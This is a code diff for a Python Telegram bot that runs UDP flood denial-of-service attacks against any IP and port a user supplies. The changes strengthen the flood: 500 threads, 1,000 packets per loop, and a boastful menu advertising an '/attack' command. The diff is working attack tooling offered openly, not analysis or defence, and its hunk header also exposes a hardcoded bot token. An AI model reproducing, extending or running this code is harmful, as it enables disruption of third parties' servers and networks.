@@ -11,27 +11,40 @@ BOT_TOKEN = "7744875151:AAF8P1vSd8awHrmaGmWQiI6d-S_fgoPvLkY"
 
 # /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    welcome_text = ("*🌟 Welcome to the Ultimate Command Center!*
+\n"
+                    "*Here’s what you can do:* \n"
+                    "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
+                    "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
+                    "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
+                    "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
+                    "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
+                    "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
+                    "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")
+
     keyboard = [
-        [InlineKeyboardButton("📩 DM Me", url="https://t.me/VIP_OWNER9")]
+        [InlineKeyboardButton("☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️", url="https://t.me/VIP_OWNER9")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("✅ Ready to attack", reply_markup=reply_markup)
 
-# UDP flood function
+    await update.message.reply_markdown(welcome_text, reply_markup=reply_markup)
+
+# ⚠️ Brutal UDP flood: sends thousands of packets per second
 def send_flood(ip, port, duration):
     timeout = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet = random._urandom(1024)  # 1KB payload
     while time.time() < timeout:
         try:
-            data = random._urandom(1024)
-            sock.sendto(data, (ip, port))
+            for _ in range(1000):  # Send 1000 packets in one loop iteration
+                sock.sendto(packet, (ip, port))
         except:
             break
     sock.close()
 
-# Multi-threaded UDP attack
-def start_attack(ip, port, duration, threads=100):
-    print(f"[✓] Starting attack on {ip}:{port} for {duration} seconds with {threads} threads.")
+# Massive multithreaded attack engine
+def start_attack(ip, port, duration, threads=500):
+    print(f"[🔥] Launching massive UDP flood on {ip}:{port} for {duration} sec with {threads} threads.")
     thread_list = []
     for _ in range(threads):
         t = threading.Thread(target=send_flood, args=(ip, port, duration))
@@ -39,7 +52,7 @@ def start_attack(ip, port, duration, threads=100):
         thread_list.append(t)
     for t in thread_list:
         t.join()
-    print("[✓] Attack completed.")
+    print("[💥] Flood completed.")
 
 # /attack command
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -55,16 +68,17 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port and duration must be numbers.")
         return
 
-    await update.message.reply_text(f"🚀 Attack started on {ip}:{port} for {duration} seconds 🔥")
+    await update.message.reply_text(f"🚀 Sending THOUSANDS of packets to {ip}:{port} for {duration} seconds 🔥")
 
     loop = asyncio.get_event_loop()
     await loop.run_in_executor(None, start_attack, ip, port, duration)
 
-    await update.message.reply_text("✅ Done! Check Target Status.")
+    await update.message.reply_text("✅ Done! Target should be flooded.")
 
 # Bot run setup
 if __name__ == "__main__":
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("attack", attack))  # ✅ Changed from /udp to /attack
+    app.add_handler(CommandHandler("attack", attack))
     app.run_polling()
+    
